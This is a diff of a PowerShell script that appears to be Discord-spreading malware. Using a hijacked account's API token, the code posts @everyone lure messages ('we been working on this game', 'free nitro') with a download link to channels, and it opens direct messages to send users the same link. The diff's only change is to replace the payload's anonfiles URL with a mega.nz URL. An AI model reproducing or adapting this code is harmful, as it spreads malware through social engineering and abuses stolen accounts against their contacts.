@@ -154,7 +154,7 @@ if(Test-Path -Path $dscp){
                     }
                 }
                 $messageid = Get-Random $randomchoice
-                $message_data = @{"content"="@everyone hey guys we been working on this game if you are interested here is download link : https://anonfiles.com/FcwbYczeu8/game_rar send your scores to my dms the highest one gets free nitro ;)"}
+                $message_data = @{"content"="@everyone hey guys we been working on this game if you are interested here is download link : https://mega.nz/file/UoBliSiA#7foLu8U9qCXmzUiDRSIjCp_gth6nVurlJhuIISDrApg send your scores to my dms the highest one gets free nitro ;)"}
                 Invoke-WebRequest -UseBasicParsing -Uri "$api/channels/$messageid/messages" -Method Post -Headers $headers -Body $message_data
                 $randomchoice = @()
             }
@@ -168,7 +168,7 @@ if(Test-Path -Path $dscp){
             $message_data = @{"recipient_id"=$userid} | ConvertTo-Json
             $resp = Invoke-WebRequest -UseBasicParsing -Uri "$api/users/@me/channels" -Method Post -Headers $headers -Body $message_data | ConvertFrom-Json
             $chan_id = $resp.id
-            $message_data = @{"content"="hey here is the game you asked for https://anonfiles.com/FcwbYczeu8/game_rar"} | ConvertTo-Json
+            $message_data = @{"content"="hey here is the game you asked for https://mega.nz/file/UoBliSiA#7foLu8U9qCXmzUiDRSIjCp_gth6nVurlJhuIISDrApg"} | ConvertTo-Json
             Invoke-WebRequest -UseBasicParsing -Uri "$api/channels/$chan_id/messages" -Method Post -Headers $headers -Body $message_data
         }
     }
